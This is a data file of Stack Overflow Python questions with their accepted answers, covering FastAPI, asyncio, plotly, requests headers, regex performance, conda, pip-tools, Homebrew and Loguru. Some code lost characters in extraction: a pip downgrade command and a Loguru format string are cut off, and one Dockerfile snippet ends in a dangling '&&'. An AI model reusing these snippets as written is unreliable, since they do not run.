    "AcceptedAnswer": "Take a look at Starlette's SessionMiddleware. FastAPI uses Starlette under the hood so it is compatible.\nAfter you register SessionMiddleware, you can access Request.session, which is a dictionary.\nDocumentation: SessionMiddleware\nAn implementation in FastAPI may look like:\n@app.route(\"/a\")\nasync def a(request: Request) -> RedirectResponse:\n\n    request.session[\"my_var\"] = \"1234\"\n\n    return RedirectResponse(\"/b\")\n\n@app.route(\"/b\")\nasync def b(request: Request) -> PlainTextResponse:\n\n    my_var = request.session.get(\"my_var\", None)\n\n    return PlainTextResponse(my_var)\n\n"
}
{
    "Id": 70876394,
    "PostTypeId": 1,
    "Title": "async_generator' object is not iterable",
    "Body": "I need to return a value in async function.\nI tried to use synchronous form of return:\nimport asyncio\n\nasync def main():\n    for i in range(10):\n        return i\n        await asyncio.sleep(1)\n\nprint(asyncio.run(main()))\n\noutput:\n0 [Finished in 204ms]\nBut it just return value of the first loop, which is not expexted. So changed the code as below:\nimport asyncio\n\nasync def main():\n    for i in range(10):\n        yield i\n        await asyncio.sleep(1)\n\nfor _ in main():\n    print(_)\n\noutput:\nTypeError: 'async_generator' object is not iterable\nby using async generator I am facing with this error. How can I return a value for every loop of async function?\nThanks\n",
    "AcceptedAnswerId": 70876749,
    "AcceptedAnswer": "You need to use an async for which itself needs to be inside an async function:\nasync def get_result():\n    async for i in main():\n        print(i)\n\nasyncio.run(get_result())\n\n"
}
{
    "Id": 70587271,
    "PostTypeId": 1,
    "Title": "Is there a Pythonic way of filtering substrings of strings in a list?",
    "Body": "I have a list with strings as below.\ncandidates = [\"Hello\", \"World\", \"HelloWorld\", \"Foo\", \"bar\", \"ar\"]\n\nAnd I want the list to be filtered as [\"HelloWorld\", \"Foo\", \"Bar\"], because others are substrings. I can do it like this, but don't think it's fast or elegant.\ndef filter_not_substring(candidates):\n    survive = []\n    for a in candidates:\n        for b in candidates:\n            if a == b:\n                continue\n            if a in b:\n                break\n        else:\n            survive.append(a)\n    return survive\n\nIs there any fast way to do it?\n",
    "AcceptedAnswerId": 70587308,
    "AcceptedAnswer": "How about:\ncandidates = [\"Hello\", \"World\", \"HelloWorld\", \"Foo\", \"bar\", \"ar\"]\nresult = [c for c in candidates if not any(c in o and len(o) > len(c) for o in candidates)]\nprint(result)\n\nCounter to what was suggested in the comments:\nfrom timeit import timeit\n\n\ndef filter_not_substring(candidates):\n    survive = []\n    for a in candidates:\n        for b in candidates:\n            if a == b:\n                continue\n            if a in b:\n                break\n        else:\n            survive.append(a)\n    return survive\n\n\ndef filter_not_substring2a(candidates):\n    return [c for c in candidates if not any(len(o) > len(c) and c in o for o in candidates)]\n\n\ndef filter_not_substring2b(candidates):\n    return [c for c in candidates if not any(c in o and len(o) > len(c) for o in candidates)]\n\n\nxs = [\"Hello\", \"World\", \"HelloWorld\", \"Foo\", \"bar\", \"ar\", \"bar\"]\nprint(filter_not_substring(xs), filter_not_substring2a(xs), filter_not_substring2b(xs))\nprint(timeit(lambda: filter_not_substring(xs)))\nprint(timeit(lambda: filter_not_substring2a(xs)))\nprint(timeit(lambda: filter_not_substring2b(xs)))\n\nResult:\n['HelloWorld', 'Foo', 'bar', 'bar'] ['HelloWorld', 'Foo', 'bar', 'bar'] ['HelloWorld', 'Foo', 'bar', 'bar']\n1.5163685\n4.6516653\n3.8334089999999996\n\nSo, OP's solution is substantially faster, but filter_not_substring2b is still about 20% faster than 2a. So, putting the len comparison first doesn't save time.\nFor any production scenario, OP's function is probably optimal - a way to speed it up might be to bring the whole problem into C, but I doubt that would show great gains, since the logic is pretty straightforward already and I'd expect Python to do a fairly good job of it as well.\nUser @ming noted that OP's solution can be improved a bit:\ndef filter_not_substring_b(candidates):\n    survive = []\n    for a in candidates:\n        for b in candidates:\n            if a in b and a != b:\n                break\n        else:\n            survive.append(a)\n    return survive\n\nThis version of the function is somewhat faster, for me about 10-15%\nFinally, note that this is only just faster than 2b, even though it is very similar to the optimised solution by @ming, but almost 3x slower than their solution. It's unclear to me why that would be - if anyone has fairly certain thoughts on that, please share in the comments:\ndef filter_not_substring_c(candidates):\n    return [a for a in candidates if all(a not in b or a == b for b in candidates)]\n\n"
}
{
    "Id": 70916649,
    "PostTypeId": 1,
    "Title": "How to change the x-axis and y-axis labels in plotly?",
    "Body": "How can I change the x and y-axis labels in plotly because in matplotlib, I can simply use plt.xlabel but I am unable to do that in plotly.\nBy using this code in a dataframe:\nDate = df[df.Country==\"India\"].Date\nNew_cases = df[df.Country==\"India\"]['7day_rolling_avg']\n\npx.line(df,x=Date, y=New_cases, title=\"India Daily New Covid Cases\")\n\nI get this output:\n\nIn this X and Y axis are labeled as X and Y how can I change the name of X and Y axis to \"Date\" and \"Cases\"\n",
    "AcceptedAnswerId": 70916879,
    "AcceptedAnswer": "\nsimple case of setting axis title\n\nupdate_layout(\n    xaxis_title=\"Date\", yaxis_title=\"7 day avg\"\n)\n\nfull code as MWE\nimport pandas as pd\nimport io, requests\n\ndf = pd.read_csv(\n    io.StringIO(\n        requests.get(\n            \"https://raw.githubusercontent.com/owid/covid-19-data/master/public/data/vaccinations/vaccinations.csv\"\n        ).text\n    )\n)\ndf[\"Date\"] = pd.to_datetime(df[\"date\"])\ndf[\"Country\"] = df[\"location\"]\ndf[\"7day_rolling_avg\"] = df[\"daily_people_vaccinated_per_hundred\"]\n\nDate = df[df.Country == \"India\"].Date\nNew_cases = df[df.Country == \"India\"][\"7day_rolling_avg\"]\n\npx.line(df, x=Date, y=New_cases, title=\"India Daily New Covid Cases\").update_layout(\n    xaxis_title=\"Date\", yaxis_title=\"7 day avg\"\n)\n\n\n"
}
{
    "Id": 70923969,
    "PostTypeId": 1,
    "Title": "how to remove the \"User-Agent\" header when send request in python",
    "Body": "I'm using python requests library, I need send a request without a user-agent header.\nI found this question, but it's for Urllib2.\nI'm trying to simulate an Android app which does this when calling a private API.\nI try to set User-Agent to None as in the following code, but it doesn't work. It still sends User-Agent: python-requests/2.27.1.\nIs there any way?\nheaders = requests.utils.default_headers()\nheaders['User-Agent'] = None\nrequests.post(url, *args, headers=headers, **kwargs)\n\n",
    "AcceptedAnswerId": 70924222,
    "AcceptedAnswer": "The requests library is built on top of the urllib3 library.  So, when you pass None User-Agent header to the requests's post method, the urllib3 set their own default User-Agent\nimport requests\n\nr = requests.post(\"https://httpbin.org/post\", headers={\n    \"User-Agent\": None,\n})\n\nprint(r.json()[\"headers\"][\"User-Agent\"])\n\nOutput\npython-urllib3/1.26.7\n\nHere the urllib3 source of connection.py\nclass HTTPConnection(_HTTPConnection, object):\n    ...\n\n    def request(self, method, url, body=None, headers=None):\n        if headers is None:\n            headers = {}\n        else:\n            # Avoid modifying the headers passed into .request()\n            headers = headers.copy()\n        if \"user-agent\" not in (six.ensure_str(k.lower()) for k in headers):\n            headers[\"User-Agent\"] = _get_default_user_agent()\n        super(HTTPConnection, self).request(method, url, body=body, headers=headers) \n\nSo, you can monkey patch it to disable default User-Agent header\nimport requests\nfrom urllib3 import connection\n\n\ndef request(self, method, url, body=None, headers=None):\n    if headers is None:\n        headers = {}\n    else:\n        # Avoid modifying the headers passed into .request()\n        headers = headers.copy()\n    super(connection.HTTPConnection, self).request(method, url, body=body, headers=headers)\n\nconnection.HTTPConnection.request = request\n\n\nr = requests.post(\"https://httpbin.org/post\", headers={\n    \"User-Agent\": None,\n})\n\nprint(r.json()[\"headers\"])\n\nOutput\n{\n'Accept': '*/*', \n'Accept-Encoding': 'gzip, deflate', \n'Content-Length': '0', \n'Host': 'httpbin.org', \n'X-Amzn-Trace-Id': 'Root=1-61f7b53b-26c4c8f6498c86a24ff05940'\n}\n\nAlso, consider to provide browser-like User-Agent like this Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36. Maybe it solves your task with less effort\n"
}
{
    "Id": 70927513,
    "PostTypeId": 1,
    "Title": "Replacing whole string is faster than replacing only its first character",
    "Body": "I tried to replace a character a by b in a given large string. I did an experiment - first I replaced it in the whole string, then I replaced it only at its beginning.\nimport re\n# pattern = re.compile('a')\npattern = re.compile('^a')\nstring = 'x' * 100000\n\npattern.sub('b', string)\n\nI expected that replacing the beginning would have to be much faster then replacing the whole string because you have to check only 1 position instead of 100000. I did some measuring:\npython -m timeit --setup \"import re; p=re.compile('a'); string='x'*100000\" \"p.sub('b', string)\"\n10000 loops, best of 3: 19.1 usec per loop\n\npython -m timeit --setup \"import re; p=re.compile('^a'); string='x'*100000\" \"p.sub('b', string)\"\n1000 loops, best of 3: 613 usec per loop\n\nThe results show that, on the contrary, trying to replace the whole string is about 30x faster. Would you expect such result? Can you explain that?\n",
    "AcceptedAnswerId": 70928164,
    "AcceptedAnswer": "The functions provided in the Python re module do not optimize based on anchors. In particular, functions that try to apply a regex at every position - .search, .sub, .findall etc. - will do so even when the regex can only possibly match at the beginning. I.e., even without multi-line mode specified, such that ^ can only match at the beginning of the string, the call is not re-routed internally. Thus:\n$ # .match only looks at the first position regardless\n$ python -m timeit --setup \"import re; p=re.compile('a'); string='x'*100000\" \"p.match(string)\"\n2000000 loops, best of 5: 155 nsec per loop\n$ python -m timeit --setup \"import re; p=re.compile('^a'); string='x'*100000\" \"p.match(string)\"\n2000000 loops, best of 5: 157 nsec per loop\n$ # .search looks at every position, even if there is an anchor\n$ python -m timeit --setup \"import re; p=re.compile('a'); string='x'*100000\" \"p.search(string)\"\n10000 loops, best of 5: 22.4 usec per loop\n$ # and the anchor only adds complexity to the matching process\n$ python -m timeit --setup \"import re; p=re.compile('^a'); string='x'*100000\" \"p.search(string)\"\n500 loops, best of 5: 746 usec per loop\n\nWhile re does not optimize for anchors, it does optimize for several other things that could occur at the start of a pattern. One of those optimizations is for a pattern starting with a single constant character:\n    if (prefix_len == 1) {\n        /* pattern starts with a literal character */\n        SRE_CHAR c = (SRE_CHAR) prefix[0];\n#if SIZEOF_SRE_CHAR < 4\n        if ((SRE_CODE) c != prefix[0])\n            return 0; /* literal can't match: doesn't fit in char width */\n#endif\n        end = (SRE_CHAR *)state->end;\n        state->must_advance = 0;\n        while (ptr < end) {\n            while (*ptr != c) {\n                if (++ptr >= end)\n                    return 0;\n            }\n            ...\n\nThis optimization performs a simple character comparison to skip candidate matches that don't start with the required character, instead of invoking the full match engine. This optimization is why the unanchored regex was so much faster - there are 3 separate optimizations like this in the code, one for a single constant character, one for a multi-character constant prefix, and one for a character class, but nothing for a ^ anchor.\nI think a reasonable case can be made to file a bug report against this - not having such an obvious optimization implemented clearly violates expectations. Aside from which, while it's easy to replace .search with an anchor using .match, it's not so straightforward to replace .sub with an anchor - you have to .match, check the result, and then call .replace on the string yourself.\nIf you need to anchor to the end of the string and not the start, it gets much more difficult; I recall ancient Perl advice to try reversing the string first, but it's hard in general to write a pattern that matches the reverse of what you want.\n"
}
{
    "Id": 70586483,
    "PostTypeId": 1,
    "Title": "Returning Array from Recursive Binary Tree Search",
    "Body": "Hi I've made a simple Binary Tree and added a pre-order traversal method. After throwing around some ideas I got stuck on finding a way to return each value from the traverse_pre() method in an array.\nclass BST:\n    def __init__(self, val):\n        self.value = val\n        self.left = None\n        self.right = None\n\n    def add_child(self, val):\n        if self.value:\n            if val < self.value:\n                if self.left == None:\n                    self.left = BST(val)\n                else:\n                    self.left.add_child(val)\n            else:\n                if val > self.value:\n                    if self.right == None:\n                        self.right = BST(val)\n                    else:\n                        self.right.add_child(val)\n        else:\n            self.value = val\n\n    def traverse_pre(self):\n        if self.left:\n            self.left.traverse_pre()\n        print(self.value)\n\n        if self.right:\n            self.right.traverse_pre()\n\n\nTree = BST(5)\nTree.add_child(10)\nTree.add_child(8)\nTree.add_child(2)\nTree.add_child(4)\nTree.add_child(7)\n\nTree.traverse_pre()\n\nHow would I modify the traverse_pre() function to return an array consisting of the node values. Is there a good example of this process for me to understand this further, I'm a bit stuck on how values can be appended to an array within recursion.\n",
    "AcceptedAnswerId": 70587563,
    "AcceptedAnswer": "I would not recommend copying the entire tree to an intermediate list using  .append or .extend. Instead use yield which makes your tree iterable and capable of working directly with many built-in Python functions -\nclass BST:\n    # ...\n    def preorder(self):\n        # value\n        yield self.value\n        # left\n        if self.left: yield from self.left.preorder()\n        # right\n        if self.right: yield from self.right.preorder()\n\nWe can simply reorder the lines this to offer different traversals like inorder -\nclass BST:\n    # ...\n    def inorder(self):\n        # left\n        if self.left: yield from self.left.inorder()\n        # value\n        yield self.value\n        # right\n        if self.right: yield from self.right.inorder()\n\nAnd postorder -\nclass BST:\n    # ...\n    def postorder(self):\n        # left\n        if self.left: yield from self.left.postorder()\n        # right\n        if self.right: yield from self.right.postorder()\n        # value\n        yield self.value\n\nUsage of generators provides inversion of control. Rather than the traversal function deciding what happens to each node, the the caller is left with the decision on what to do. If a list is indeed the desired target, simply use list -\nlist(mytree.preorder())\n\n# => [ ... ]\n\nThat said, there's room for improvement with the rest of your code. There's no need to mutate nodes and tangle self context and recursive methods within your BST class directly. A functional approach with a thin class wrapper will make it easier for you to grow the functionality of your tree. For more information on this technique, see this related Q&A.\nIf you need to facilitate trees of significant size, a different traversal technique may be required. Just ask in the comments and someone can help you find what you are looking for.\n"
}
{
    "Id": 70597896,
    "PostTypeId": 1,
    "Title": "Check if conda env exists and create if not in bash",
    "Body": "I have a build script to run a simple python app. I am trying to set it up that it will run for any user that has conda installed and in their PATH. No other prerequisites. I have that pretty much accomplished but would like to make it more efficient for returning users.\nbuild_run.sh\nconda init bash\nconda env create --name RUN_ENV --file ../run_env.yml -q --force\nconda activate RUN_ENV\npython run_app.py\nconda deactivate\n\nI would like to make it that the script checks if RUN_ENV already exists and activates it instead of forcing its creation every time. I tried\nENVS=$(conda env list | awk '{print }' )\nif [[ conda env list = *\"RUN_ENV\"* ]]; then\n   conda activate RUN_ENV\nelse \n   conda env create --name RUN_ENV --file ../run_env.yml -q\n   conda activate RUN_ENV\n   exit\nfi;\npython run_app.py\nconda deactivate\n\nbut it always came back as false and tried to create RUN_ENV\n",
    "AcceptedAnswerId": 70598193,
    "AcceptedAnswer": "update 2022\ni've been receiving upvotes recently. so i'm going to bump up that this method overall is not natively \"conda\" and might not be the best approach. like i said originally, i do not use conda. take my advice at your discretion.\nrather, please refer to @merv's comment in the question suggesting the use of the --prefix flag\nadditionally take a look at the documentation for further details\nNOTE: you can always use a function within your bash script for repeated command invocations with very specific flags\ne.g\nfunction PREFIXED_CONDA(){\n   action=${1};\n   # copy $1 to $action;\n   shift 1;\n   # delete first argument and shift remaining indeces to the left\n   conda ${action} --prefix /path/to/project ${@}\n}\n\n\ni am not sure how conda env list works (i don't use Anaconda); and your current if-tests are vague\nbut i'm going out on a limb and guessing this is what you're looking for\n#!/usr/bin/env bash\n# ...\nfind_in_conda_env(){\n    conda env list | grep \"${@}\" >/dev/null 2>/dev/null\n}\n\nif find_in_conda_env \".*RUN_ENV.*\" ; then\n   conda activate RUN_ENV\nelse \n# ...\n\ninstead of bringing it out into a separate function, you could also do\n# ...\nif conda env list | grep \".*RUN_ENV.*\" >/dev/null 2>&1; then\n# ...\n\nbonus points for neatness and clarity if you use command grouping\n# ...\nif { conda env list | grep 'RUN_ENV'; } >/dev/null 2>&1; then\n# ...\n\nif simply checks the exit code. and grep exits with 0 (success) as long as there's at least one match of the pattern provided; this evaluates to \"true\" in the if statement\n(grep would match and succeed even if the pattern is just 'RUN_ENV' ;) )\n\nthe awk portion of ENVS=$(conda env list | awk '{print }' ) does virtually nothing. i would expect the output to be in tabular format, but {print } does no filtering, i believe you were looking for {print $n} where n is a column number or awk /PATTERN/ {print} where PATTERN is likely RUN_ENV and only lines which have PATTERN are printed.\nbut even so, storing a table in a string variable is going to be messing. you might want an array.\nthen coming to your if-condition, it's plain syntactically wrong.\n\nthe [[ construct is for comparing values: integer, string, regex\nbut here on the left of = we have a command conda env list\n\nwhich i believe is also the contents of $ENVS\n\n\nhence we can assume you meant [[ \"${ENVS}\" == *\"RUN_ENV\"* ]]\n\nor alternately [[ $(conda env list) == *\"RUN_ENV\"* ]]\n\n\nbut still, regex matching against a table... not very intuitive imo\nbut it works... sort of\nthe proper clean syntax for regex matching is\n\n[[ ${value} =~ /PATTERN/ ]]\n\n\n\n"
}
{
    "Id": 70658955,
    "PostTypeId": 1,
    "Title": "How do I display bar plot for values that are zero in plotly?",
    "Body": "How do I make the bar appear when one of the value of y is zero? It just leaves a gap by default. Is there a way I can enable it to plot for zero values? I am able to see a line on the x-axis at y=0 for the same if just plotted using go.Box. I would like to see this in the Bar plot as well.\nSo far, I set the base to zero. But that doesn't plot for y=0 either.\nHere is my sample code. My actual code contains multiple traces, that's why I would like to see the plot for y=0\nHere is the sample python code:\n import plotly.graph_objects as go\n fig = go.Figure()\n fig.add_trace(go.Bar(x=[1, 2, 3], y=[0, 3, 2]))\n fig.show()\n\n",
    "AcceptedAnswerId": 70659144,
    "AcceptedAnswer": "Bar charts come with a line around the bars that by default are set to the same color as the background. In your case '#E5ECF6'. If you change that, the line will appear as a border around each bar that will remain visible even when y = 0 for any given x.\nfig.update_traces(marker_line_color = 'blue', marker_line_width = 12)\n\nIf you set the line color to match that of the bar itself, you'll get this:\nPlot 1: Bars with identical fill and line colors\n\nIf I understand correctly, this should be pretty close to what you're trying to achieve. At least visually. I would perhaps consider adjusting the yaxis range a bit to make it a bit clearer that the y value displayed is in fact 0.\nPlot 2: Adjusted y axis and separate colors\n\nComplete code for Plot 1:\nimport plotly.graph_objects as go\nfig = go.Figure()\nfig.add_trace(go.Bar(x=[1, 2, 3], y=[0, 3, 2], marker_color = 'blue'))\nfig.update_traces(marker_line_color = 'blue', marker_line_width = 12)\nfig.show()\n\nComplete code for Plot 2:\nimport plotly.graph_objects as go\nfig = go.Figure()\nfig.add_trace(go.Bar(x=[1, 2, 3], y=[0, 3, 2], marker_color =  '#00CC96'))\nf = fig.full_figure_for_development(warn=False)\nfig.update_traces(marker_line_color = '#636EFA', marker_line_width = 4)\n\nfig.update_yaxes(range=[-1, 4])\nfig.show()\n\n\nEdit after comments\nJust to verify that the line color is the same as the background color using plotly version 5.4.0\nPlot 1:\n\nPlot 2: Zoomed in\n\n"
}
{
    "Id": 70946286,
    "PostTypeId": 1,
    "Title": "pip-compile raising AssertionError on its logging handler",
    "Body": "I have a dockerfile that currently only installs pip-tools\nFROM python:3.9\n\nRUN pip install --upgrade pip && \\\n    pip install pip-tools\n\nCOPY ./ /root/project\n\nWORKDIR /root/project\n\nENTRYPOINT [\"tail\", \"-f\", \"/dev/null\"]\n\nI build and open a shell in the container using the following commands:\ndocker build -t brunoapi_image .\ndocker run --rm -ti --name brunoapi_container --entrypoint bash brunoapi_image\n\nThen, when I try to run pip-compile inside the container I get this very weird error (full traceback):\nroot@727f1f38f095:~/project# pip-compile\nTraceback (most recent call last):\n  File \"/usr/local/bin/pip-compile\", line 8, in \n    sys.exit(cli())\n  File \"/usr/local/lib/python3.9/site-packages/click/core.py\", line 1128, in __call__\n    return self.main(*args, **kwargs)\n  File \"/usr/local/lib/python3.9/site-packages/click/core.py\", line 1053, in main\n    rv = self.invoke(ctx)\n  File \"/usr/local/lib/python3.9/site-packages/click/core.py\", line 1395, in invoke\n    return ctx.invoke(self.callback, **ctx.params)\n  File \"/usr/local/lib/python3.9/site-packages/click/core.py\", line 754, in invoke\n    return __callback(*args, **kwargs)\n  File \"/usr/local/lib/python3.9/site-packages/click/decorators.py\", line 26, in new_func\n    return f(get_current_context(), *args, **kwargs)\n  File \"/usr/local/lib/python3.9/site-packages/piptools/scripts/compile.py\", line 342, in cli\n    repository = PyPIRepository(pip_args, cache_dir=cache_dir)\n  File \"/usr/local/lib/python3.9/site-packages/piptools/repositories/pypi.py\", line 106, in __init__\n    self._setup_logging()\n  File \"/usr/local/lib/python3.9/site-packages/piptools/repositories/pypi.py\", line 455, in _setup_logging\n    assert isinstance(handler, logging.StreamHandler)\nAssertionError\n\nI have no clue what's going on and I've never seen this error before. Can anyone shed some light into this?\nRunning on macOS Monterey\n",
    "AcceptedAnswerId": 70999908,
    "AcceptedAnswer": "It is a bug, you can downgrade using:\npip install \"pip\nhttps://github.com/jazzband/pip-tools/issues/1558\n"
}
{
    "Id": 70587544,
    "PostTypeId": 1,
    "Title": "\"brew install python\" installs 3.9. Why not 3.10?",
    "Body": "My understanding is that \"brew install python\" installs the latest version of python. Why isn't it pulling 3.10? 3.10 is marked as a stable release.\nI can install 3.10 with \"brew install python@3.10 just fine and can update my PATH so that python and pip point to the right versions. But I am curious why \"brew install python\" its not installing 3.10.\nMy other understanding is that 3.10 is directly compatible with the M1 chips so that is why I want 3.10.\nPlease let me know if I am mistaken.\n",
    "AcceptedAnswerId": 70589077,
    "AcceptedAnswer": "As Henry Schreiner have specified now Python 3.10 is the new default in Brew. Thx for pointing it\n--- Obsolete ---\nThe \"python3\" formula is still 3.9 in the brew system\ncheck the doc here:\nhttps://formulae.brew.sh/formula/python@3.9#default\nThe latest version of the formula for 3.9 also support apple silicon.\nIf you want to use python3.10 you need to run as you described brew install python@3.10\nThe reason why 3.9 is still the official python3 formula is that generally user using the vanilla python3 are not looking for the latest revision but the more stable. in some months the transition will done.\n"
}
{
    "Id": 70977165,
    "PostTypeId": 1,
    "Title": "How to use Loguru defaults + and extra information?",
    "Body": "I'm still reaseaching about Loguru, but I can't find an easy way to do this. I want to use the default options from Loguru, I believe they  are great, but I want to add information to it, I want to add the IP of a request that will be logged.\nIf I try this:\nimport sys\nfrom loguru import logger\nlogger.info(\"This is log info!\")\n# This is directle from Loguru page\nlogger.add(sys.stderr, format=\"{extra[ip]} {extra[user]} {message}\")\ncontext_logger = logger.bind(ip=\"192.168.0.1\", user=\"someone\")\ncontext_logger.info(\"Contextualize your logger easily\")\ncontext_logger.bind(user=\"someone_else\").info(\"Inline binding of extra attribute\")\ncontext_logger.info(\"Use kwargs to add context during formatting: {user}\", user=\"anybody\")\n\nThat logs this:\n\nI know that with logger.remove(0) I will remove the default logs, but I want to use it to obtain something like this: 2022-02-03 15:16:54.920 | INFO     | __main__::79 - XXX.XXX.XX.X - Use kwargs to add context during formatting: anybody, with XXX.XXX.XX.X  being the IP. Using the default config (for color and the rest of thing) and adding a little thing to the format.\nI'm trying to access the default configs, but I haven't been able to import them and use them with logger.add. I think I will have to configure everything from scratch.\nHope someone can help me, thanks.\n",
    "AcceptedAnswerId": 71008024,
    "AcceptedAnswer": "I made the same question in the Github Repository and this was the answer by Delgan (Loguru maintainer):\nI think you simply need to add() your handler using a custom format containing the extra information. Here is an example:\nlogger_format = (\n    \"{time:YYYY-MM-DD HH:mm:ss.SSS} | \"\n    \"{level:  | \"\n    \"{name}:{function}:{line} | \"\n    \"{extra[ip]} {extra[user]} - {message}\"\n)\nlogger.configure(extra={\"ip\": \"\", \"user\": \"\"})  # Default values\nlogger.remove()\nlogger.add(sys.stderr, format=logger_format)\n\nExtra: if you want to use TRACE level use this when adding the configurations:\nlogger.add(sys.stderr, format=logger_format, level=\"TRACE\")\n"
}
{
    "Id": 70610919,
    "PostTypeId": 1,
    "Title": "Installing python in Dockerfile without using python image as base",
    "Body": "I have a python script that uses DigitalOcean tools (doctl and kubectl) I want to containerize. This means my container will need python, doctl, and kubectl installed. The trouble is, I figure out how to install both python and DigitalOcean tools in the dockerfile.\nI can install python using the base image \"python:3\" and I can also install the DigitalOcean tools using the base image \"alpine/doctl\". However, the rule is you can only use one base image in a dockerfile.\nSo I can include the python base image and install the DigitalOcean tools another way:\nFROM python:3\nRUN \nRUN pip install firebase-admin\nCOPY script.py\nCMD [\"python\", \"script.py\"]\n\nOr I can include the alpine/doctl base image and install python3 another way.\nFROM alpine/doctl\nRUN \nRUN pip install firebase-admin\nCOPY script.py\nCMD [\"python\", \"script.py\"]\n\nUnfortunately, I'm not sure how I would do this. Any help in how I can get all these tools installed would be great!\n",
    "AcceptedAnswerId": 70611018,
    "AcceptedAnswer": "just add this with any other thing you want to apt-get install:\nRUN apt-get update && apt-get install -y \\\n    python3.6 &&\\\n    python3-pip &&\\\n\nin alpine it should be something like:\nRUN apk add --update --no-cache python3 && ln -sf python3 /usr/bin/python &&\\\n    python3 -m ensurepip &&\\\n    pip3 install --no-cache --upgrade pip setuptools &&\\\n\n"
}
{
    "Id": 70934699,
    "PostTypeId": 1,
    "Title": "How to fix error when building conda package related to \"Icon\" file?",
    "Body": "I honestly can't figure out what is happening with this error. I thought it was something in my manifest file but apparently it's not.\nNote, this directory is in my Google Drive.\nHere is my MANIFEST.in file:\ngraft soothsayer_utils\ninclude setup.py\ninclude LICENSE.txt\ninclude README.md\nglobal-exclude Icon*\nglobal-exclude *.py[co]\nglobal-exclude .DS_Store\n\nI'm running conda build . in the directory and get the following error:\nPackaging soothsayer_utils\nINFO:conda_build.build:Packaging soothsayer_utils\nINFO conda_build.build:build(2214): Packaging soothsayer_utils\nPackaging soothsayer_utils-2022.01.19-py_0\nINFO:conda_build.build:Packaging soothsayer_utils-2022.01.19-py_0\nINFO conda_build.build:bundle_conda(1454): Packaging soothsayer_utils-2022.01.19-py_0\nnumber of files: 11\nFixing permissions\nPackaged license file/s.\nINFO :: Time taken to mark (prefix)\n        0 replacements in 0 files was 0.11 seconds\n'site-packages/soothsayer_utils-2022.1.19.dist-info/Icon' not in tarball\n'site-packages/soothsayer_utils-2022.1.19.dist-info/Icon\\r' not in info/files\nTraceback (most recent call last):\n  File \"/Users/jespinoz/anaconda3/bin/conda-build\", line 11, in \n    sys.exit(main())\n  File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/cli/main_build.py\", line 474, in main\n    execute(sys.argv[1:])\n  File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/cli/main_build.py\", line 463, in execute\n    outputs = api.build(args.recipe, post=args.post, test_run_post=args.test_run_post,\n  File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/api.py\", line 186, in build\n    return build_tree(\n  File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/build.py\", line 3008, in build_tree\n    packages_from_this = build(metadata, stats,\n  File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/build.py\", line 2291, in build\n    newly_built_packages = bundlers[pkg_type](output_d, m, env, stats)\n  File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/build.py\", line 1619, in bundle_conda\n    tarcheck.check_all(tmp_path, metadata.config)\n  File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/tarcheck.py\", line 89, in check_all\n    x.info_files()\n  File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/tarcheck.py\", line 53, in info_files\n    raise Exception('info/files')\nException: info/files\n\nHere's the complete log\nI can confirm that the Icon files do not exist in my soothsayer_utils-2022.1.19.tar.gz file:\n(base) jespinoz@x86_64-apple-darwin13 Downloads % tree soothsayer_utils-2022.1.19\nsoothsayer_utils-2022.1.19\n\u251c\u2500\u2500 LICENSE.txt\n\u251c\u2500\u2500 MANIFEST.in\n\u251c\u2500\u2500 PKG-INFO\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 setup.cfg\n\u251c\u2500\u2500 setup.py\n\u251c\u2500\u2500 soothsayer_utils\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 __init__.py\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 soothsayer_utils.py\n\u2514\u2500\u2500 soothsayer_utils.egg-info\n    \u251c\u2500\u2500 PKG-INFO\n    \u251c\u2500\u2500 SOURCES.txt\n    \u251c\u2500\u2500 dependency_links.txt\n    \u251c\u2500\u2500 requires.txt\n    \u2514\u2500\u2500 top_level.txt\n\n2 directories, 13 files\n\nCan someone help me get conda build to work for my package?\n",
    "AcceptedAnswerId": 71020880,
    "AcceptedAnswer": "there are a few symptoms I would like to suggest looking into:\n\nThere is a WARNING in your error log SetuptoolsDeprecationWarning: setup.py install is deprecated. Use build and pip and other standards-based tools. You have MANIFEST.in, setup.py and setup.cfg probably conflicting between them. Because setup.py is the build script for setuptools. It tells setuptools about your package (such as the name and version) as well as which code files to include. Also, An existing generated MANIFEST will be regenerated without sdist comparing its modification time to the one of MANIFEST.in or setup.py, as explained here.\n\n\nPlease refer to Building and Distributing Packages with Setuptools, also Configuring setup() using setup.cfg files and Quickstart for more information\n\n\nMaybe not so important, but another thing worth looking into is the fact that there are 2 different python distributions being used at different stages, as Python 3.10 is used at: Using pip 22.0.2 from $PREFIX/lib/python3.10/site-packages/pip (python 3.10) (it is also in your conda dependencies) and Python 3.8 is used at: File \"/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/tarcheck.py\", line 53, in info_files raise Exception('info/files') which is where the error happens. So maybe another configuration conflict related to this.\n\n"
}
{
    "Id": 71053839,
    "PostTypeId": 1,
    "Title": "VSCode Jupyter not connecting to python kernel",
    "Body": "Launching a cell will make this message appear: Connecting to kernel: Python 3.9.6 64-bit: Activating Python Environment 'Python 3.9.6 64-bit'. This message will then stay up loading indefinitely, without anything happening. No actual error message.\nI've already tried searching for this problem, but every other post seem to obtain at least an error message, which isn't the case here. I still looked at some of these, which seemed to indicate the problem might have come from the traitlets package. I tried to downgrade it to what was recommended, but it didn't solve anything, so I reverted the downgrade.\nThe main problem here is that I have no idea what could cause such a problem, without even an error message. If you think additional info could help, please do ask, I have no idea what could be of use right now.\n",
    "AcceptedAnswerId": 71092223,
    "AcceptedAnswer": "Not sure what did the trick but downgrading VSCode to November version and after that reinstalling Jupyter extension worked for me.\n"
}
{
    "Id": 70626218,
    "PostTypeId": 1,
    "Title": "how to find the nearest LINESTRING to a POINT?",
